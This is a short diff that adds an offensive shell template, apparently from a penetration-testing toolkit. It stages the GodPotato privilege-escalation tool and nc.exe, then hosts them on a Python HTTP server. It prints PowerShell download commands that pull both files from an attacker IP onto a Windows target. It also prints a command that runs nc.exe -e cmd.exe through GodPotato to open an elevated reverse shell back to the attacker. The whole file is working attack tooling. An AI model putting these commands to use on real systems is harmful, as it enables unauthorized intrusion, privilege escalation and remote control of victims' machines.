@@ -1,0 +1,10 @@
+mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/godpotato/* /usr/share/windows-resources/binaries/nc.exe packstation/outbound/; \
+echo '================================================================'; \
+echo '                      -----PowerShell-----                      '; \
+echo 'Preparation 1 (deliver nc.exe): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/nc.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\nc.exe'; \
+echo 'Deliver (NET4): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/GodPotato-NET4.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\GodPotato.exe'; \
+echo '================================================================'; \
+echo '                      -Suggested Commands-                      '; \
+echo 'To open another revshell with elevated privileges: <%=$(esh variables/delivery_path_windows)%>\GodPotato.exe -cmd "<%=$(esh variables/delivery_path_windows)%>\nc.exe -e cmd.exe <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>"'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
